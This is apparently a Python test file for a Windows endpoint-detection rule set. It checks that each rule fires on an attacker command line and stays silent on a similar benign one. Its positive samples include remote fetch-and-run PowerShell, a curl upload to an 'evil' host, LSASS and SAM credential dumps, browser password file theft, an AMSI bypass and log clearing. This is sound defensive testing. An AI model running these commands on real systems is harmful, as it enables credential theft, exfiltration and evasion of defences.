# -*- coding: utf-8 -*-
"""攻击方视角规则实测：正例必须命中、反例必须不命中。

正例 = 攻击者真实会敲的命令；反例 = 长得像但正常的行为（运维/安装/日常）。
这一层跑得干净，才敢说规则不是自己骗自己。
"""
import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
os.environ["BLUEGUARD_DATA"] = os.path.join(os.environ["TEMP"], "bg_atk_rules")

from backend import schema            # noqa: E402
from backend.guard import rules       # noqa: E402

schema.migrate()
rules.ensure_seed()

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

PASS, FAIL = [], []

WIN = r"C:\Windows\System32"


def P(pid, name, exe, cmd, parent=""):
    return {"pid": pid, "name": name, "exe": exe, "ppid": 1,
            "cmdline": cmd, "parent_name": parent, "parent_exe": "", "parent_cmdline": ""}


def C(rip, rport, state="ESTABLISHED", pname=""):
    return {"remote_ip": rip, "remote_port": rport, "local_ip": "10.0.0.5",
            "local_port": 50000, "state": state, "pid": 1, "process_name": pname}


TEMP_EXE = r"C:\Users\a\AppData\Local\Temp\svc.exe"

cases = [
    ("OFFICE-CHILD-SHELL",
     P(1, "cmd.exe", WIN + r"\cmd.exe", "cmd.exe /c whoami", "winword.exe"),
     P(2, "cmd.exe", WIN + r"\cmd.exe", "cmd.exe /c dir", "explorer.exe")),
    ("EXPLORER-CHILD-LOLBIN",
     P(3, "mshta.exe", WIN + r"\mshta.exe", "mshta.exe http://1.2.3.4/a.hta", "explorer.exe"),
     P(4, "notepad.exe", r"C:\Windows\notepad.exe", "notepad.exe", "explorer.exe")),
    ("BROWSER-CHILD-SHELL",
     P(5, "powershell.exe", WIN + r"\WindowsPowerShell\v1.0\powershell.exe",
       "powershell -c 1", "chrome.exe"),
     P(6, "chrome.exe", r"C:\chrome.exe", "chrome", "explorer.exe")),
    ("EXEC-FROM-TEMP",
     P(7, "svc.exe", TEMP_EXE, "svc.exe", "explorer.exe"),
     P(8, "code.exe", r"C:\Program Files\VSCode\code.exe", "code.exe", "explorer.exe")),
    ("PS-HIDDEN",
     P(9, "powershell.exe", WIN + r"\powershell.exe",
       "powershell.exe -nop -w hidden -c whoami", "cmd.exe"),
     P(10, "powershell.exe", WIN + r"\powershell.exe", "powershell.exe -c Get-Date", "explorer.exe")),
    ("PS-FROM-STRING",
     P(11, "powershell.exe", WIN + r"\powershell.exe",
       "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://a/b')", "cmd.exe"),
     P(12, "powershell.exe", WIN + r"\powershell.exe", "powershell -c Get-Process", "explorer.exe")),
    ("RUNDLL32-ORDINAL",
     P(13, "rundll32.exe", WIN + r"\rundll32.exe",
       "rundll32.exe " + TEMP_EXE + ".dll, #1", "cmd.exe"),
     P(14, "rundll32.exe", WIN + r"\rundll32.exe",
       "rundll32.exe shell32.dll,Control_RunDLL", "explorer.exe")),
    ("SCRIPT-HOST-REMOTE",
     P(15, "wscript.exe", WIN + r"\wscript.exe", "wscript.exe http://evil/a.vbs", "explorer.exe"),
     P(16, "wscript.exe", WIN + r"\wscript.exe", r"wscript.exe C:\scripts\logon.vbs", "explorer.exe")),
    ("CERTUTIL-DECODE",
     P(17, "certutil.exe", WIN + r"\certutil.exe", r"certutil.exe -decode C:\a.b64 C:\a.exe", "cmd.exe"),
     P(18, "certutil.exe", WIN + r"\certutil.exe", "certutil.exe -dump", "cmd.exe")),
    ("PERSIST-SERVICE-CREATE",
     P(19, "sc.exe", WIN + r"\sc.exe",
       "sc.exe create Updater binPath= " + TEMP_EXE, "cmd.exe"),
     P(20, "sc.exe", WIN + r"\sc.exe", "sc.exe query wuauserv", "cmd.exe")),
    ("PERSIST-WMI-SUBSCRIPTION",
     P(21, "powershell.exe", WIN + r"\powershell.exe",
       "powershell -c Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name='x'}", "cmd.exe"),
     None),
    ("UAC-BYPASS-PARENT",
     P(22, "cmd.exe", WIN + r"\cmd.exe", "cmd.exe /c calc", "fodhelper.exe"),
     P(23, "cmd.exe", WIN + r"\cmd.exe", "cmd.exe /c dir", "explorer.exe")),
    ("PRIVESC-TOOL",
     P(24, "PrintSpoofer.exe", r"C:\Users\a\Downloads\PrintSpoofer.exe", "PrintSpoofer.exe -i -c cmd", "cmd.exe"),
     P(25, "potato.dll", r"C:\Program Files\App\potato.dll", "", "explorer.exe")),
    ("LSASS-DUMP",
     P(26, "procdump64.exe", r"C:\tools\procdump64.exe",
       r"procdump64.exe -accepteula -ma 624 C:\temp\lsass.dmp", "cmd.exe"),
     P(27, "procdump64.exe", r"C:\tools\procdump64.exe",
       r"procdump64.exe -accepteula -ma 1234 C:\temp\app.dmp", "cmd.exe")),
    ("SAM-DUMP",
     P(28, "reg.exe", WIN + r"\reg.exe", r"reg.exe save hklm\sam C:\temp\sam.hiv", "cmd.exe"),
     P(29, "reg.exe", WIN + r"\reg.exe", r"reg.exe query hkcu\software", "cmd.exe")),
    ("BROWSER-CRED-ACCESS",
     P(30, "cmd.exe", WIN + r"\cmd.exe",
       r"cmd.exe /c copy C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Login Data C:\t.db",
       "explorer.exe"),
     None),
    ("HOST-RECON",
     P(31, "whoami.exe", WIN + r"\whoami.exe", "whoami.exe /all", "cmd.exe"),
     P(32, "whoami.exe", WIN + r"\whoami.exe", "whoami.exe", "cmd.exe")),
    ("AV-ENUM",
     P(33, "powershell.exe", WIN + r"\powershell.exe", "powershell -c Get-MpComputerStatus", "cmd.exe"),
     P(34, "powershell.exe", WIN + r"\powershell.exe", "powershell -c Get-Process", "cmd.exe")),
    ("LOG-CLEAR",
     P(35, "wevtutil.exe", WIN + r"\wevtutil.exe", "wevtutil.exe cl Security", "cmd.exe"),
     P(36, "wevtutil.exe", WIN + r"\wevtutil.exe", "wevtutil.exe qe Security", "cmd.exe")),
    ("DEFENDER-EXCLUSION",
     P(37, "powershell.exe", WIN + r"\powershell.exe",
       "powershell -c Add-MpPreference -ExclusionPath C:\\Users\\a\\AppData", "cmd.exe"),
     None),
    ("AMSI-BYPASS",
     P(38, "powershell.exe", WIN + r"\powershell.exe",
       "powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "cmd.exe"),
     None),
    ("FIREWALL-OPEN-HOLE",
     P(39, "netsh.exe", WIN + r"\netsh.exe",
       "netsh advfirewall firewall add rule name=x dir=in action=allow port=4444", "cmd.exe"),
     P(40, "netsh.exe", WIN + r"\netsh.exe", "netsh advfirewall show allprofiles", "cmd.exe")),
    ("LATERAL-TOOL",
     P(41, "PsExec64.exe", r"C:\Users\a\PsExec64.exe", r"PsExec64.exe \\10.0.0.9 -s cmd", "cmd.exe"),
     P(42, "psexec.exe", r"C:\Program Files\Sysinternals\psexec.exe", "", "explorer.exe")),
    ("LATERAL-ADMIN-SHARE",
     P(43, "cmd.exe", WIN + r"\cmd.exe",
       r"cmd.exe /c copy C:\a.exe \\10.0.0.9\admin$\a.exe", "explorer.exe"),
     None),
    ("STAGING-ARCHIVE",
     P(44, "7z.exe", r"C:\Program Files\7-Zip\7z.exe",
       r"7z.exe a C:\t.7z C:\Users\a\Documents", "cmd.exe"),
     P(45, "7z.exe", r"C:\Program Files\7-Zip\7z.exe", r"7z.exe a C:\backup.7z D:\work", "cmd.exe")),
    ("EXFIL-UPLOAD",
     P(46, "curl.exe", WIN + r"\curl.exe", r"curl.exe -F file=@C:\t.7z http://evil/up", "cmd.exe"),
     P(47, "curl.exe", WIN + r"\curl.exe", "curl.exe https://api.github.com", "cmd.exe")),
    ("RANSOM-RECOVERY-KILL",
     P(48, "bcdedit.exe", WIN + r"\bcdedit.exe",
       "bcdedit.exe /set {default} recoveryenabled no", "cmd.exe"),
     P(49, "bcdedit.exe", WIN + r"\bcdedit.exe", "bcdedit.exe /enum", "cmd.exe")),
    ("C2-COMMON-PORT",
     C("203.0.113.7", 4444),
     C("203.0.113.7", 80)),
    ("SMB-EXTERNAL",
     C("203.0.113.7", 445, "SYN_SENT"),
     C("10.0.0.9", 445, "ESTABLISHED")),
]


def run():
    loaded = {r["rule_id"]: r for r in rules.load_rules()}
    chains = [r for r in loaded.values() if r.get("category") == "chain"]
    print("已加载规则: %d（其中链模板 %d）" % (len(loaded), len(chains)))
    for rid, pos, neg in cases:
        r = loaded.get(rid)
        if not r:
            FAIL.append((rid, "规则不存在"))
            continue
        cond = r.get("cond")
        if rules.evaluate(cond, pos):
            PASS.append((rid, "正例命中"))
        else:
            FAIL.append((rid, "正例未命中 -> %s" % (pos.get("cmdline") or pos)))
        if neg is not None:
            if rules.evaluate(cond, neg):
                FAIL.append((rid, "反例误报 -> %s" % (neg.get("cmdline") or neg)))
            else:
                PASS.append((rid, "反例未误报"))

    print("\nPASS %d / FAIL %d" % (len(PASS), len(FAIL)))
    for rid, msg in FAIL:
        print("  FAIL %-22s %s" % (rid, msg))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(run())
